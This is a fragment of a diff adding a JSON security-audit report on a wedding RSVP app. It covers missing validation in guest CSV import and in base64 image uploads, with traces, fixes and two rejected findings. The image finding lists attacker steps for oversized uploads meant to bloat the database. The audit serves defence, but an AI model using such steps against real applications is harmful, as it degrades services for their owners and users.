+            "fixed_code": "Add: if (rows.length > 500) return { error: 'Maximum 500 guests per import' }; and: plusOneCount: Math.max(0, parseInt(row.plusOneCount) || 0)"
+          },
+          {
+            "file_name": "src/db/migrations",
+            "fixed_code": "Add UNIQUE constraint on (weddingId, loginCode) to allow DB-level uniqueness enforcement"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "low",
+          "reason": "Requires authenticated access. Negative plusOneCount is a data integrity issue, not a security breach."
+        },
+        "impact": {
+          "score": "low",
+          "reason": "Resource exhaustion possible with large CSV. Negative plusOneCount causes UI display issues."
+        },
+        "overall_severity": "medium"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Source code confirmed. parseInt behavior tested: parseInt('-5') returns -5, '-5' || 0 returns -5. N+1 pattern confirmed at line 188."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "Base64 Image Upload — No Size or Dimension Validation",
+      "description": "The updateWeddingAppearanceAction and updateWeddingShowcaseAction persist logoData and showcaseHeroData (base64-encoded images) directly to the database with no validation of decoded size or image dimensions. The server action bodySizeLimit is 50MB, allowing uploads of up to ~37MB of actual image data (after base64 overhead).",
+      "root_cause": "updateWeddingAppearanceAction and updateWeddingShowcaseAction in src/app/actions/wedding.ts do not decode or validate base64 image payloads before persisting them to the database.",
+      "intended_behavior": "Allow users to upload custom logos and hero images for their wedding showcase page.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/wedding.ts",
+          "line": 458,
+          "scope": "updateWeddingAppearanceAction",
+          "description": "Stores logoData as-is: logoData: data.logoData || null — no size validation"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/wedding.ts",
+          "line": 516,
+          "scope": "updateWeddingShowcaseAction",
+          "description": "Stores showcaseHeroData as-is: ...(data.showcaseHeroData !== undefined && { showcaseHeroData }) — no size validation"
+        },
+        {
+          "kind": "propagation",
+          "file": "next.config.ts",
+          "line": 8,
+          "scope": "configuration",
+          "description": "bodySizeLimit: '50mb' — allows up to ~37MB of actual image data per request"
+        },
+        {
+          "kind": "sink",
+          "file": "src/db/schema.ts",
+          "line": 0,
+          "scope": "wedding table",
+          "description": "logoData (text) and showcaseHeroData (text) columns — no size constraints in DB schema"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "authentication_level",
+          "description": "Requires authenticated admin session"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "Authenticated admin user.",
+        "payloads": [
+          "Base64-encoded 30MB image data sent as logoData"
+        ],
+        "instructions": [
+          "1. Encode a large image (25-30MB) as base64 data URI",
+          "2. Submit via Appearance form or API call",
+          "3. Image data is stored in the wedding table row — no validation"
+        ],
+        "expected_result": "Large binary blob stored in database. Potential DB bloat, slow page loads when fetching the wedding row."
+      },
+      "remediation": {
+        "strategy": "Validate decoded base64 size server-side (max 5MB). Consider storing images in object storage (S3/R2) instead of DB. Validate image dimensions and type.",
+        "code_changes": [
+          {
+            "file_name": "src/app/actions/wedding.ts",
+            "fixed_code": "Add: const decoded = Buffer.from(data.logoData.split(',')[1] || data.logoData, 'base64'); if (decoded.length > 5 * 1024 * 1024) return { error: 'Image must be under 5MB' };"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "low",
+          "reason": "Requires authenticated access. Large image upload is a resource abuse, not data theft."
+        },
+        "impact": {
+          "score": "low",
+          "reason": "DB bloat and potential performance degradation. No data exfiltration or privilege escalation."
+        },
+        "overall_severity": "medium"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Source code confirmed at both storage sites. next.config.ts bodySizeLimit confirmed. No size validation code exists anywhere in the image upload path."
+      }
+    },
+    {
+      "verdict": "rejected",
+      "reason": "The finding claimed that updateGuestRSVPAction, deleteGuestAction, updateGuestAction, and batchInsertGuestsAction have no authentication checks. This is incorrect — all four functions call getServerSession() and return 'Unauthorized' if no session exists (guests.ts:62-64, 84-86, 114-116, 156-158). The three public-facing functions (findGuestByCodeAction, updateGuestRsvpPublicAction, saveGuestRsvpAction) are intentionally designed without server session auth because they serve the guest RSVP flow where invitees have no user account. In these functions, the guest code IS the authentication mechanism — a standard pattern for account-less RSVP systems (hotel booking links, event RSVPs, etc.)."
+    },
+    {
+      "verdict": "rejected",
+      "reason": "The finding claimed that hardcoded secrets and weak BETTER_AUTH_SECRET exist in git history. Investigation found: (1) docker-compose.yml:12 uses ${POSTGRES_PASSWORD:-postgres} — a shell variable with default, not bare hardcoded; (2) src/db/client.ts:6 fallback is local-dev only, never reached in production; (3) .env.example:13 has BETTER_AUTH_SECRET='CHANGE_ME_MIN_32_CHAR_RANDOM_SECRET' which is explicitly a placeholder; (4) docker-compose.yml:31 uses ${BETTER_AUTH_SECRET:-} with empty default; (5) .gitignore:36-38 ignores .env and .env.local, preventing real secrets from being committed. No API keys, real passwords, or production secrets were ever committed to git. The postgres:postgres credential is the universally-known PostgreSQL default superuser credential — it poses zero security risk in git history."
+    }
+  ]
+}
